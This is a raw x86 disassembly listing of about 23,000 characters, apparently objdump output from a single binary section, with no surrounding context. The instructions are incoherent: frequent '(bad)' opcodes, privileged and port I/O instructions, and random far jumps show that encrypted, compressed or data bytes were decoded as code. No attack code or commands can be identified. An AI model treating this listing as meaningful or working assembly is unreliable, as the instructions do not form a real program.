  427466:	push   0x5f327cdb
  42746b:	dec    eax
  42746c:	xor    ebp,edx
  42746e:	bound  eax,QWORD PTR [esi-0x53]
  427471:	xchg   edi,eax
  427472:	out    dx,eax
  427473:	setae  BYTE PTR [edi+0x3f8622db]
  42747a:	fwait
  42747b:	(bad)  
  42747c:	and    dl,dl
  42747e:	jno    0x427496
  427480:	and    ch,BYTE PTR [ecx]
  427482:	mov    eax,ds:0x1e1b88f5
  427487:	xchg   BYTE PTR [eax-0x49],al
  42748a:	mov    ecx,0x594ebd75
  42748f:	push   edx
  427490:	xchg   ebx,eax
  427491:	mov    bl,0xfb
  427493:	stos   DWORD PTR es:[edi],eax
  427494:	and    ah,bl
  427496:	and    bl,BYTE PTR [ecx+esi*2-0x16c694e]
  42749d:	test   ah,bh
  42749f:	push   ss
  4274a0:	hlt    
  4274a1:	into   
  4274a2:	xchg   BYTE PTR [esi+esi*2],al
  4274a5:	sbb    eax,0x110c649c
  4274aa:	push   ebp
  4274ab:	jp     0x427444
  4274ad:	inc    esi
  4274ae:	cmp    eax,0x3e4921ef
  4274b3:	xchg   ecx,eax
  4274b4:	mov    dl,0x7e
  4274b6:	aas    
  4274b7:	and    BYTE PTR [eax-0x49],al
  4274ba:	loop   0x427505
  4274bc:	inc    ebx
  4274bd:	(bad)  
  4274be:	clc    
  4274bf:	fstp   DWORD PTR [esi-0xa]
  4274c2:	gs ret 0xd9b2
  4274c6:	lahf   
  4274c7:	cs push es
  4274c9:	adc    cl,cl
  4274cb:	xchg   esp,eax
  4274cc:	mov    esp,0x9777a2f
  4274d1:	pop    edi
  4274d2:	add    dh,bh
  4274d4:	or     DWORD PTR [edi],ecx
  4274d6:	leave  
  4274d7:	es pop eax
  4274d9:	jmp    0x4274a4
  4274db:	mov    ecx,DWORD PTR [ebp+esi*2-0x5c]
  4274df:	hlt    
  4274e0:	je     0x42746a
  4274e2:	pop    eax
  4274e3:	aam    0x10
  4274e5:	mov    WORD PTR [edx-0x7f2072c6],?
  4274eb:	cmp    DWORD PTR [eax+0x50],0xee11b5e8
  4274f2:	xchg   edi,eax
  4274f3:	pusha  
  4274f4:	add    al,0x70
  4274f6:	dec    ebp
  4274f7:	nop
  4274f8:	cmp    eax,0x666a1cc8
  4274fd:	scas   al,BYTE PTR es:[edi]
  4274fe:	push   eax
  4274ff:	or     ebx,DWORD PTR [ebx+0x10f38f79]
  427505:	jns    0x4274c6
  427507:	js     0x4274f7
  427509:	jmp    0x3bfb2df9
  42750e:	cs pop es
  427510:	sub    DWORD PTR [eax-0x7f],eax
  427513:	adc    DWORD PTR [ebp+0x61],esi
  427516:	and    DWORD PTR ds:[ecx],edi
  427519:	fimul  DWORD PTR [ebp-0x40713911]
  42751f:	cmp    bh,dl
  427521:	mov    al,dl
  427523:	pop    ebp
  427524:	xor    BYTE PTR [edx+0x2a3790cc],ch
  42752a:	xor    al,0x1a
  42752c:	cmp    DWORD PTR [ebp+0x1b],eax
  42752f:	stos   DWORD PTR es:[edi],eax
  427530:	in     eax,dx
  427531:	arpl   ax,cx
  427533:	push   0xcedc8770
  427538:	jecxz  0x4274dd
  42753a:	cmp    BYTE PTR [eax+0x36],ch
  42753d:	dec    edx
  42753e:	repz adc DWORD PTR [edx+0x7a],0x30
  427543:	lea    ecx,[ebp+0x4d]
  427546:	lods   al,BYTE PTR ds:[esi]
  427547:	hlt    
  427548:	out    0xd2,al
  42754a:	sbb    bl,bh
  42754c:	les    esp,FWORD PTR [edi]
  42754e:	lock nop
  427550:	int    0xee
  427552:	sub    eax,0x8ce5258e
  427557:	lods   eax,DWORD PTR ds:[esi]
  427558:	outs   dx,BYTE PTR ds:[esi]
  427559:	or     DWORD PTR [esi-0x5d406376],ecx
  42755f:	div    DWORD PTR ds:0x2d86dd7e
  427565:	cli    
  427566:	jno    0x42751f
  427568:	and    DWORD PTR [ebx+0x1f83d708],0xe394dc04
  427572:	xor    dh,0x39
  427575:	add    esi,DWORD PTR [ebp-0x14]
  427578:	push   eax
  427579:	jp     0x427513
  42757b:	inc    eax
  42757c:	pushf  
  42757d:	jmp    0xe377:0xd0d2217c
  427584:	popf   
  427585:	dec    edx
  427586:	xor    eax,0xe99e020
  42758b:	stc    
  42758c:	sbb    DWORD PTR [ebx+0x785d82b4],esp
  427592:	ret    0xef95
  427595:	push   ebp
  427596:	mov    ebx,0x334f6173
  42759b:	xchg   DWORD PTR [edi+eiz*1+0x26],esi
  42759f:	add    eax,0xa7a55eed
  4275a4:	pop    edx
  4275a5:	mov    esp,DWORD PTR [esi]
  4275a7:	mov    ch,0xba
  4275a9:	int    0xc2
  4275ab:	mov    ebp,0xfddfb777
  4275b0:	and    ebx,0xfffffffb
  4275b3:	inc    edi
  4275b4:	mov    bh,BYTE PTR [esi-0x7705fa5f]
  4275ba:	mov    dh,0x54
  4275bc:	pop    edi
  4275bd:	jle    0x427633
  4275bf:	pushf  
  4275c0:	jle    0x4275df
  4275c2:	push   0xffffffa2
  4275c4:	xchg   ecx,eax
  4275c5:	pop    ecx
  4275c6:	mov    ds:0x9183e2bd,al
  4275cb:	leave  
  4275cc:	iret   
  4275cd:	adc    dh,ch
  4275cf:	pop    esi
  4275d0:	pusha  
  4275d1:	sar    ebp,1
  4275d3:	mov    edi,edi
  4275d5:	xchg   ecx,eax
  4275d6:	sub    dl,BYTE PTR [ebp-0x2735a3b]
  4275dc:	push   ebp
  4275dd:	or     ebx,ecx
  4275df:	mov    ds:0x14bb7caf,eax
  4275e4:	test   al,0xc
  4275e6:	mov    ebx,0x3ddf74a
  4275eb:	sti    
  4275ec:	mov    edx,0xaca91901
  4275f1:	rcl    cl,1
  4275f3:	ror    BYTE PTR [ebp+0x7a],cl
  4275f6:	mov    ebp,0x60a65c76
  4275fb:	sub    DWORD PTR [edi],0x6d
  4275fe:	push   eax
  4275ff:	mov    ecx,0xe4abc6e3
  427604:	scas   eax,DWORD PTR es:[edi]
  427605:	jge    0x427589
  427607:	ret    0x6f2
  42760a:	cmp    al,0x71
  42760c:	dec    ebx
  42760d:	aad    0xf2
  42760f:	lock mov cl,0x98
  427612:	dec    eax
  427613:	in     al,0xf
  427615:	pmaddwd mm4,QWORD PTR [eax+0x4d]
  427619:	(bad)
  42761d:	adc    eax,0x1001b3f0
  427622:	ins    BYTE PTR es:[edi],dx
  427623:	mov    ah,0x95
  427625:	mov    eax,0x8ff1712
  42762a:	jns    0x427656
  42762c:	add    esp,DWORD PTR [eax-0x415891c9]
  427632:	pop    ecx
  427633:	shl    dh,cl
  427635:	cmp    eax,0xf8d10094
  42763a:	outs   dx,DWORD PTR ds:[esi]
  42763b:	cmc    
  42763c:	add    eax,0xcbee1fd1
  427641:	clc    
  427642:	pop    edi
  427643:	lods   al,BYTE PTR ds:[esi]
  427644:	xor    esp,DWORD PTR [ebx+edi*8+0x2ddf5efd]
  42764b:	das    
  42764c:	cmp    BYTE PTR [eax-0x6ade5326],dh
  427652:	fs fs fsubp st(1),st
  427656:	cmp    eax,0xc8ef3ff3
  42765b:	xor    BYTE PTR [ecx],dl
  42765d:	or     eax,0xcf03dbff
  427662:	int    0x47
  427664:	sbb    ebx,DWORD PTR [esi]
  427666:	ror    DWORD PTR [esi-0x66],1
  427669:	jo     0x4276b7
  42766b:	fmul   st,st(2)
  42766d:	pop    ds
  42766e:	xchg   BYTE PTR [eax],cl
  427670:	mov    ah,0x2e
  427672:	dec    esp
  427673:	xor    DWORD PTR [esi-0x50],edx
  427676:	in     eax,dx
  427677:	jb     0x42764d
  427679:	call   0xb50cf65e
  42767e:	in     al,dx
  42767f:	pop    edx
  427680:	test   BYTE PTR [edi+0x1b3901fc],ch
  427686:	jl     0x427659
  427688:	in     eax,dx
  427689:	ror    DWORD PTR [eax],cl
  42768b:	in     al,0x5c
  42768d:	xchg   edx,eax
  42768e:	mov    ebp,DWORD PTR [esi-0x16]
  427691:	sbb    DWORD PTR [edx],edi
  427693:	jg     0x4276bf
  427695:	sbb    eax,ebx
  427697:	call   0xbee1:0x9ecf79f4
  42769e:	mov    ds:0xcd89a4e7,al
  4276a3:	xchg   edi,eax
  4276a4:	adc    ch,al
  4276a6:	cmp    DWORD PTR [edi-0x4c],eax
  4276a9:	add    eax,0x691f70e8
  4276ae:	cmp    bh,BYTE PTR [esi-0x38]
  4276b1:	add    eax,0x5c18d919
  4276b6:	push   edi
  4276b7:	xor    eax,0x8e3f4174
  4276bc:	jg     0x427720
  4276be:	inc    eax
  4276bf:	daa    
  4276c0:	jb     0x427683
  4276c2:	in     al,0x56
  4276c4:	ja     0x427696
  4276c6:	lods   eax,DWORD PTR ds:[esi]
  4276c7:	daa    
  4276c8:	or     al,0x26
  4276ca:	or     al,bh
  4276cc:	adc    eax,0x260e566f
  4276d1:	add    ebx,DWORD PTR [ecx+ebp*2+0x5c]
  4276d5:	fwait
  4276d6:	inc    esp
  4276d7:	(bad)  
  4276d8:	pop    edx
  4276d9:	scas   eax,DWORD PTR es:[edi]
  4276da:	leave  
  4276db:	fnstsw WORD PTR [edi]
  4276dd:	aas    
  4276de:	and    esp,DWORD PTR [ecx+0x74889520]
  4276e4:	inc    edx
  4276e5:	dec    ebp
  4276e6:	jae    0x427719
  4276e8:	mov    eax,ds:0x3126946f
  4276ed:	ja     0x427689
  4276ef:	adc    DWORD PTR [edi+eax*4],0x69006cbb
  4276f6:	je     0x42774e
  4276f8:	lea    ebp,[ebx]
  4276fa:	xchg   BYTE PTR [eax-0x63],cl
  4276fd:	aaa    
  4276fe:	xchg   DWORD PTR [esi+0x62],esp
  427701:	inc    esp
  427702:	jge    0x427773
  427704:	into   
  427705:	push   eax
  427706:	push   ebp
  427707:	and    BYTE PTR [ebx],bh
  427709:	adc    bl,BYTE PTR [esi+esi*4+0x53]
  42770d:	retf   
  42770e:	xchg   ecx,eax
  42770f:	jle    0x4276a5
  427711:	jnp    0x4276f5
  427713:	mov    esi,0x5d43feac
  427718:	frstor [edi]
  42771a:	adc    DWORD PTR [ecx+ebp*4-0xf],eax
  42771e:	xor    esi,DWORD PTR [ebp-0x54]
  427721:	mov    cl,0x5e
  427723:	adc    eax,DWORD PTR [edi-0x39]
  427726:	popf   
  427727:	xor    al,0x9b
  427729:	push   cs
  42772a:	das    
  42772b:	cmp    ah,BYTE PTR [eax]
  42772d:	adc    eax,esp
  42772f:	lock jne 0x427747
  427732:	mov    ?,esi
  427734:	push   0x4c
  427736:	pop    esi
  427737:	ss std 
  427739:	sti    
  42773a:	push   esi
  42773b:	sub    bl,0x25
  42773e:	clc    
  42773f:	xor    al,0xef
  427741:	mov    ebp,0x319582f1
  427746:	xchg   ebp,eax
  427747:	cmp    al,0xa
  427749:	and    BYTE PTR [edi-0x3a81a8d5],0xf2
  427750:	fld    DWORD PTR [ebx]
  427752:	mov    esp,0x78268834
  427757:	out    0x62,al
  427759:	in     eax,dx
  42775a:	fimul  DWORD PTR [ecx-0x1c]
  42775d:	cmp    al,0xef
  42775f:	sar    esp,cl
  427761:	aad    0x9f
  427763:	lds    ecx,FWORD PTR [ebx-0x75]
  427766:	jae    0x427737
  427768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427769:	add    al,0xcf
  42776b:	icebp  
  42776c:	cli    
  42776d:	ficomp DWORD PTR [edx-0x29]
  427770:	and    DWORD PTR [edi+0x68],edx
  427773:	lea    esi,[ebx]
  427775:	cmp    eax,ecx
  427777:	and    bl,BYTE PTR [eax+0x4d]
  42777a:	xor    al,0xa4
  42777c:	repnz or al,0x40
  42777f:	mov    dl,0x87
  427781:	push   edx
  427782:	or     DWORD PTR [esi],esi
  427784:	xlat   BYTE PTR ds:[ebx]
  427785:	dec    eax
  427786:	add    DWORD PTR [edi-0x2],0x4b0250a4
  42778d:	and    eax,0x9ba24af6
  427792:	mov    bl,0x5e
  427794:	inc    esi
  427795:	jae    0x427730
  427797:	xchg   ebp,eax
  427798:	(bad)  
  427799:	jno    0x4277b7
  42779b:	mov    bl,0x12
  42779d:	dec    eax
  42779e:	add    cl,ah
  4277a0:	mov    esp,0x6d7889bf
  4277a5:	mov    dl,0x49
  4277a7:	adc    DWORD PTR [ebp+0x5b454ab5],ecx
  4277ad:	push   ecx
  4277ae:	retf   
  4277af:	cld    
  4277b0:	sar    BYTE PTR [ebx+edx*2],cl
  4277b3:	mov    BYTE PTR [edx],dl
	...
  4277c1:	sub    al,0x44
  4277c3:	and    edi,DWORD PTR [eax+0x6b]
  4277c6:	jg     0x427847
  4277c8:	push   esp
  4277c9:	adc    edi,DWORD PTR [ebp-0x248b5d8a]
  4277cf:	sbb    eax,DWORD PTR [ecx+esi*4]
  4277d2:	in     eax,dx
  4277d3:	add    DWORD PTR [eax],eax
  4277d5:	lods   al,BYTE PTR ds:[esi]
  4277d6:	add    eax,DWORD PTR [eax]
  4277d8:	add    BYTE PTR [eax],ah
  4277da:	(bad)  [esi-0x7b7a3bc4]
  4277e0:	out    0xab,eax
  4277e2:	pop    es
  4277e3:	adc    eax,DWORD PTR [ecx-0x7a194e3b]
  4277e9:	xor    ch,BYTE PTR [edx]
  4277eb:	arpl   bp,sp
  4277ed:	lahf   
  4277ee:	out    dx,eax
  4277ef:	jmp    0xeb40ff44
  4277f4:	add    DWORD PTR [ecx],ebp
  4277f6:	ins    BYTE PTR es:[edi],dx
  4277f7:	or     dh,BYTE PTR [ebx+0x34ad7975]
  4277fd:	test   DWORD PTR [ebp-0x23962957],0xccbf0a48
  427807:	xchg   edx,eax
  427808:	ror    DWORD PTR [ecx-0x4c2ef497],0xcb
  42780f:	mov    bh,0x76
  427811:	jb     0x4277be
  427813:	add    DWORD PTR [ebx+0x4c],esp
  427816:	inc    ebx
  427817:	or     cl,ah
  427819:	arpl   WORD PTR [edx],cx
  42781b:	fdiv   QWORD PTR [edx]
  42781d:	loope  0x427875
  42781f:	sbb    ebx,DWORD PTR es:[bp+di]
  427823:	loop   0x42786e
  427825:	jno    0x427865
  427827:	cli    
  427828:	ror    DWORD PTR [esi+0x1cc23a99],cl
  42782e:	fisubr DWORD PTR [ebp-0x501dffce]
  427834:	mov    ds:0x4c2710cd,eax
  427839:	sbb    ebp,eax
  42783b:	shld   DWORD PTR [edx-0x5],esi,0xb3
  427840:	dec    edx
  427841:	mov    ds:0xb9e0b2da,al
  427846:	icebp  
  427847:	clc    
  427848:	shr    al,cl
  42784a:	scas   eax,DWORD PTR es:[edi]
  42784b:	(bad)  
  42784c:	test   eax,0x31e99fca
  427851:	mov    DWORD PTR [edx+edx*2-0x55],esi
  427855:	xor    eax,0xa5b650b8
  42785a:	or     al,dl
  42785c:	dec    ebp
  42785d:	push   ss
  42785e:	mov    edi,DWORD PTR [ebx]
  427860:	inc    ebp
  427861:	dec    ebp
  427862:	adc    eax,esp
  427864:	sub    dh,cl
  427866:	mov    dl,0xcb
  427868:	ja     0x4278a9
  42786a:	retf   0xfc07
  42786d:	mov    ch,BYTE PTR [ebp+0x4ea44ec2]
  427873:	mov    ah,0xb2
  427875:	loopne 0x427857
  427877:	les    eax,FWORD PTR [edx+eiz*4]
  42787a:	sub    dh,dh
  42787c:	mov    esp,0x962a2710
  427881:	das    
  427882:	and    ah,ah
  427884:	std    
  427885:	xchg   ch,cl
  427887:	dec    esp
  427888:	lea    esi,[ecx+0x35]
  42788b:	cwde   
  42788c:	and    DWORD PTR [eax+ecx*8+0x49ed8bb4],0x0
  427894:	sbb    BYTE PTR [edi-0x27],bl
  427897:	cmp    al,0xd8
  427899:	fyl2xp1 
  42789b:	mov    ebp,0x12cc74aa
  4278a0:	inc    ebx
  4278a1:	or     DWORD PTR [edi-0x618f85d3],esp
  4278a7:	push   es
  4278a8:	adc    eax,0x2f04269d
  4278ad:	retf   
  4278ae:	cmp    BYTE PTR [ebx],ch
  4278b0:	push   edx
  4278b1:	pop    ecx
  4278b2:	mov    WORD PTR [ebx],ds
  4278b4:	push   es
  4278b5:	adc    DWORD PTR [ebx+0x2c],eax
  4278b8:	ret    
  4278b9:	cwde   
  4278ba:	xchg   edi,eax
  4278bb:	stc    
  4278bc:	xchg   edi,eax
  4278bd:	sub    dh,al
  4278bf:	jl     0x4278e4
  4278c1:	jmp    0x929ee2fb
  4278c6:	cdq    
  4278c7:	add    BYTE PTR [ebx-0x7fd94f17],0xb1
  4278ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278cf:	hlt    
  4278d0:	shr    BYTE PTR [esi+0x6e],cl
  4278d3:	mov    eax,0x5c0bf55
  4278d8:	jge    0x4278ec
  4278da:	(bad)  
  4278db:	jb     0x427929
  4278dd:	scas   eax,DWORD PTR es:[edi]
  4278de:	sti    
  4278df:	sti    
  4278e0:	inc    edi
  4278e1:	aad    0x3d
  4278e3:	imul   eax,DWORD PTR ds:0x5b716d7e,0x99879e5a
  4278ed:	cwde   
  4278ee:	add    DWORD PTR [ebx+ebx*2],esp
  4278f1:	jns    0x427938
  4278f3:	pop    ebx
  4278f4:	mov    cl,0xa0
  4278f6:	jbe    0x4278fd
  4278f8:	cmp    al,0x8d
  4278fa:	inc    ecx
  4278fb:	(bad)
  4278fe:	or     BYTE PTR [esi-0x67],dh
  427901:	les    edi,FWORD PTR [edx+0x101bf135]
  427907:	nop
  427908:	repz and ecx,esp
  42790b:	dec    ebp
  42790c:	stos   DWORD PTR es:[edi],eax
  42790d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42790e:	xlat   BYTE PTR ds:[ebx]
  42790f:	(bad)  
  427911:	int    0xd5
  427913:	mov    ds:0x3e0788a8,al
  427918:	add    eax,0xa6e3e3c8
  42791d:	(bad)  
  42791e:	push   0xffffffc7
  427920:	jbe    0x4278c3
  427922:	daa    
  427923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427924:	or     ebp,DWORD PTR [ebp+0x7fd44794]
  42792a:	mov    dh,0x37
  42792c:	call   0x30cd:0xc4e1f32
  427933:	jg     0x427982
  427935:	sub    dl,BYTE PTR [edx+esi*2-0x6e728ebb]
  42793c:	mov    cl,0x7
  42793e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42793f:	pop    esp
  427940:	jae    0x427968
  427942:	and    al,0x9d
  427944:	pop    eax
  427945:	cli    
  427946:	inc    esp
  427947:	push   eax
  427948:	pop    eax
  427949:	pop    edi
  42794a:	sbb    BYTE PTR [edi+esi*2-0x2bcc3c9],bh
  427951:	mov    cl,0xb2
  427953:	xchg   edx,eax
  427954:	add    al,0x61
  427956:	mov    esp,0x36c1ccc8
  42795b:	sbb    bh,bl
  42795d:	jne    0x4279a3
  42795f:	dec    ebx
  427960:	(bad)  
  427961:	mov    bl,0x71
  427963:	xchg   BYTE PTR [edi-0x9],ah
  427966:	lahf   
  427967:	je     0x42793a
  427969:	xchg   edx,eax
  42796a:	lahf   
  42796b:	lock in al,0x10
  42796e:	ret    
  42796f:	fisubr DWORD PTR [ecx-0x58]
  427972:	xor    DWORD PTR [esp+eax*8+0x54],ebp
  427976:	pop    ds
  427977:	lods   al,BYTE PTR ds:[esi]
  427978:	and    BYTE PTR [ebp+ecx*2-0x1e],bl
  42797c:	mov    bh,0x1b
  42797e:	lock rcl eax,0xcb
  427982:	mov    ds:0x685a0131,eax
  427987:	sbb    al,0x2d
  427989:	and    al,BYTE PTR [eax+0x7e38bff3]
  42798f:	sbb    ebp,DWORD PTR [ebx-0x6f86d165]
  427995:	mov    DWORD PTR [edx+edx*4],ebp
  427998:	(bad)
  42799c:	adc    edx,DWORD PTR [esi]
  42799e:	pop    ebp
  42799f:	add    ch,BYTE PTR [ebx-0x36]
  4279a2:	inc    esi
  4279a3:	xchg   DWORD PTR [ebx+0x30eb99b9],edx
  4279a9:	fcmovnbe st,st(6)
  4279ab:	fldenv [eax+0x355e431b]
  4279b1:	xor    DWORD PTR [eax-0x74],eax
  4279b4:	mov    esp,eax
  4279b6:	mov    al,0x76
  4279b8:	sahf   
  4279b9:	inc    ebx
  4279ba:	add    BYTE PTR [ebx+0xa],bh
  4279bd:	push   edx
  4279be:	jmp    0x4279fb
  4279c0:	cmp    cl,0xec
  4279c3:	xor    BYTE PTR [esi-0x7a],0xc8
  4279c7:	xlat   BYTE PTR ds:[ebx]
  4279c8:	ror    bh,1
  4279ca:	imul   ebx,edi,0xffffffb2
  4279cd:	pop    eax
  4279ce:	mov    WORD PTR [edx-0x1e],fs
  4279d1:	add    eax,0x9254174d
  4279d6:	or     BYTE PTR [edi+0x23bc3163],bl
  4279dc:	xor    dh,BYTE PTR [esp+ebp*2+0x70]
  4279e0:	xor    DWORD PTR [edi+0x5c],ecx
  4279e3:	pushf  
  4279e4:	mov    edi,0x119e3363
  4279e9:	loop   0x4279b4
  4279eb:	mov    ebp,0x6ffea96c
  4279f0:	mov    ebp,0xde4cacfb
  4279f5:	imul   ebp,DWORD PTR [ebx+0x5],0xb79ef4f2
  4279fc:	outs   dx,BYTE PTR fs:[esi]
  4279fe:	push   eax
  4279ff:	mov    al,ds:0x4a0c4352
  427a04:	outs   dx,BYTE PTR ds:[esi]
  427a05:	test   al,0x5e
  427a07:	sub    dl,bh
  427a09:	arpl   WORD PTR [ecx],bx
  427a0b:	push   ebx
  427a0c:	lea    edi,[esi+0x12]
  427a0f:	in     al,dx
  427a10:	(bad)  
  427a11:	sbb    al,0xd4
  427a13:	or     al,0xf6
  427a15:	and    ecx,DWORD PTR [ecx+0x42]
  427a18:	push   0xbcf6c9a4
  427a1d:	sub    DWORD PTR [eax-0x7b91bd79],esi
  427a23:	hlt    
  427a24:	in     eax,dx
  427a25:	gs add bh,bl
  427a28:	loope  0x427a08
  427a2a:	sbb    eax,0xae7ca5e7
  427a2f:	mov    edi,0xde3e5ffa
  427a34:	cmp    al,0xec
  427a36:	iret   
  427a37:	repz adc ebp,DWORD PTR [ebp-0x3e]
  427a3b:	imul   esp,ecx,0xffffffa9
  427a3e:	sub    al,0x78
  427a40:	mov    ds:0xf9dae6db,al
  427a45:	int3   
  427a46:	popf   
  427a47:	pop    ebx
  427a48:	in     al,0xe0
  427a4a:	das    
  427a4b:	pushf  
  427a4c:	xchg   esi,eax
  427a4d:	stos   BYTE PTR es:[edi],al
  427a4e:	(bad)  
  427a50:	sbb    BYTE PTR [ebx-0x67],0xa1
  427a54:	xchg   edx,eax
  427a55:	nop
  427a56:	push   ebx
  427a57:	mov    al,ds:0x3854ace9
  427a5c:	sbb    al,0x6e
  427a5e:	or     BYTE PTR [ebx+0x79],dl
  427a61:	cli    
  427a62:	sbb    al,0xd8
  427a64:	es nop
  427a66:	pushf  
  427a67:	pushf  
  427a68:	rol    ecx,cl
  427a6a:	ret    
  427a6b:	std    
  427a6c:	sti    
  427a6d:	sub    eax,0xbb796194
  427a72:	and    ebp,DWORD PTR [eax]
  427a74:	jae    0x427aa1
  427a76:	(bad)  
  427a77:	scas   eax,DWORD PTR es:[edi]
  427a78:	cld    
  427a79:	xchg   dl,bl
  427a7b:	inc    ecx
  427a7c:	push   edx
  427a7d:	sub    BYTE PTR [esi-0x750de5df],0x5e
  427a84:	mov    ah,0x3c
  427a86:	(bad)  
  427a87:	call   0x558ef719
  427a8c:	daa    
  427a8d:	cmp    eax,0x8e0feb94
  427a92:	sbb    DWORD PTR [eax],0xd270d573
  427a98:	inc    edx
  427a99:	push   DWORD PTR [eiz*8+0x144d1dc8]
  427aa0:	mov    ecx,DWORD PTR [ebp+0x2eeabb74]
  427aa6:	cli    
  427aa7:	out    dx,eax
  427aa8:	sahf   
  427aa9:	mov    ecx,0x3a17a6d0
  427aae:	test   DWORD PTR [edx+0x25e994ed],ecx
  427ab4:	(bad)  
  427ab5:	rcl    DWORD PTR [esi],cl
  427ab7:	lahf   
  427ab8:	hlt    
  427ab9:	add    eax,0xdfe1e537
  427abe:	out    0xdc,al
  427ac0:	add    DWORD PTR [eax],ebp
  427ac2:	xchg   ebx,eax
  427ac3:	push   esi
  427ac4:	fisubr DWORD PTR ds:0x50651334
  427aca:	lock (bad) 
  427acc:	mov    ebx,0x6d30744a
  427ad1:	loop   0x427a5f
  427ad3:	es inc ebx
  427ad5:	cmp    BYTE PTR [esi],al
  427ad7:	outs   dx,BYTE PTR ds:[esi]
  427ad8:	call   0xb01338df
  427add:	stc    
  427ade:	inc    edi
  427adf:	sti    
  427ae0:	bound  ebp,QWORD PTR [ecx]
  427ae2:	into   
  427ae3:	dec    edi
  427ae4:	lahf   
  427ae5:	and    al,0x8c
  427ae7:	mov    cl,0x7b
  427ae9:	and    al,0x4
  427aeb:	push   cs
  427aec:	xchg   ebp,eax
  427aed:	ds cs gs adc al,0x1e
  427af2:	sbb    BYTE PTR [ecx+esi*2],0x24
  427af6:	dec    eax
  427af7:	add    eax,0xa38fe42e
  427afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427afd:	mov    ebx,0xd2575855
  427b02:	mov    dl,0x91
  427b04:	repnz mov cl,BYTE PTR ds:0x6baa976b
  427b0b:	inc    esp
  427b0c:	test   BYTE PTR [edx],0xcc
  427b0f:	sbb    al,0x58
  427b11:	mov    bh,0x65
  427b13:	dec    esi
  427b14:	test   al,0x46
  427b16:	sti    
  427b17:	repz sub DWORD PTR [edx],esp
  427b1a:	out    0x11,eax
  427b1c:	dec    eax
  427b1d:	mov    ds:0x67930a26,eax
  427b22:	and    eax,0x9df12d72
  427b27:	xchg   ecx,eax
  427b28:	iret   
  427b29:	pusha  
  427b2a:	push   ebp
  427b2b:	aas    
  427b2c:	(bad)  
  427b2e:	push   esp
  427b2f:	stos   DWORD PTR es:[edi],eax
  427b30:	sub    cl,BYTE PTR [edx+eax*4+0x12]
  427b34:	push   0x5fa41a2
  427b39:	loopne 0x427b6e
  427b3b:	mov    ch,0x85
  427b3d:	leave  
  427b3e:	jb     0x427b55
  427b40:	pop    ds
  427b41:	and    ebx,ebx
  427b43:	dec    BYTE PTR [ecx-0x7f]
  427b46:	aaa    
  427b47:	test   eax,0x78447d03
  427b4c:	xor    ebp,DWORD PTR [ebx]
  427b4e:	icebp  
  427b4f:	jp     0x427b72
  427b51:	xor    edi,DWORD PTR [ebp-0x61c9ea01]
  427b57:	dec    eax
  427b58:	imul   eax,DWORD PTR [edi],0xb21bb3c1
  427b5e:	push   ss
  427b5f:	(bad)  
  427b60:	cs push eax
  427b62:	int3   
  427b63:	call   ebp
  427b65:	lock adc ebx,DWORD PTR [eax-0x2b]
  427b69:	push   cs
  427b6a:	sub    DWORD PTR fs:[esi+eiz*1-0x6782ab00],edi
  427b72:	enter  0xe99d,0x8e
  427b76:	data16 mov BYTE PTR [eax+0xc6ce3a],dh
  427b7d:	sub    esi,DWORD PTR [ebp+0x11859369]
  427b83:	fwait
  427b84:	popa   
	...
  427b91:	sub    esp,eax
  427b93:	jnp    0x427bcd
  427b95:	sti    
  427b96:	mov    ebx,0x345ef36b
  427b9b:	aaa    
  427b9c:	mov    DWORD PTR [ecx+0x5d23d176],ecx
  427ba2:	icebp  
  427ba3:	add    DWORD PTR [eax],eax
  427ba5:	lods   al,BYTE PTR ds:[esi]
  427ba6:	add    eax,DWORD PTR [eax]
  427ba8:	add    BYTE PTR [ecx-0x6f024d28],ch
  427bae:	inc    edi
  427baf:	xchg   BYTE PTR [ebp+edx*1+0x51],dl
  427bb3:	inc    edi
  427bb4:	pop    edx
  427bb5:	add    al,0x69
  427bb7:	push   edx
  427bb8:	int3   
  427bb9:	xchg   BYTE PTR [edi],cl
  427bbb:	inc    edi
  427bbc:	push   es
  427bbd:	adc    DWORD PTR [ebx-0x312d9a2c],eax
  427bc3:	inc    esi
  427bc4:	jne    0x427c15
  427bc6:	cld    
  427bc7:	cmp    BYTE PTR [esi],cl
  427bc9:	mov    ecx,DWORD PTR [esi-0x166f1892]
  427bcf:	bound  ebx,QWORD PTR [edi+0x3]
  427bd2:	imul   ebx,ebp,0x4b
  427bd5:	cmp    eax,0x6b8699f7
  427bda:	stos   DWORD PTR es:[edi],eax
  427bdb:	(bad)  
  427bdc:	cwde   
  427bdd:	mov    ?,edx
  427bdf:	add    BYTE PTR [ebx-0x3842a2a7],dl
  427be5:	sub    ch,ah
  427be7:	mov    ch,0x36
  427be9:	jle    0x427bf9
  427beb:	jl     0x427c2c
  427bed:	ds (bad) 
  427bef:	hlt    
  427bf0:	ror    al,cl
  427bf2:	shl    DWORD PTR [ebp+0x1fe3a094],1
  427bf8:	xchg   ebx,eax
  427bf9:	adc    ah,BYTE PTR [edx+0x58]
  427bfc:	sbb    ebx,ebp
  427bfe:	(bad)  
  427c00:	pop    ss
  427c01:	xchg   ecx,eax
  427c02:	ja     0x427c6e
  427c04:	sub    ecx,ebx
  427c06:	lds    ecx,FWORD PTR [ecx-0x578b3ef8]
  427c0c:	fisttp WORD PTR [ebx+0x16ca2253]
  427c12:	mov    bl,0x48
  427c14:	out    0x7d,al
  427c16:	lods   al,BYTE PTR cs:[esi]
  427c18:	push   0x237eb3c0
  427c1d:	stos   DWORD PTR es:[edi],eax
  427c1e:	xchg   ecx,eax
  427c1f:	fbstp  TBYTE PTR [ecx-0x5d118784]
  427c25:	jne    0x427c9a
  427c27:	enter  0xfaad,0xf
  427c2b:	push   ds
  427c2c:	mov    ebp,0x48e4ecf2
  427c31:	aam    0xf0
  427c33:	enter  0xe884,0xe2
  427c37:	in     eax,0x96
  427c39:	mov    eax,ds:0x64df5cc2
  427c3e:	lock loop 0x427c42
  427c41:	cdq    
  427c42:	dec    ecx
  427c43:	enter  0xc101,0xe1
  427c47:	fadd   DWORD PTR [edx+0x3]
  427c4a:	fadd   QWORD PTR [eax-0x61b1f549]
  427c50:	(bad)  
  427c51:	out    0xcf,al
  427c53:	xor    al,0xa6
  427c55:	sbb    BYTE PTR [ebp+0xb],0x1c
  427c59:	push   ebp
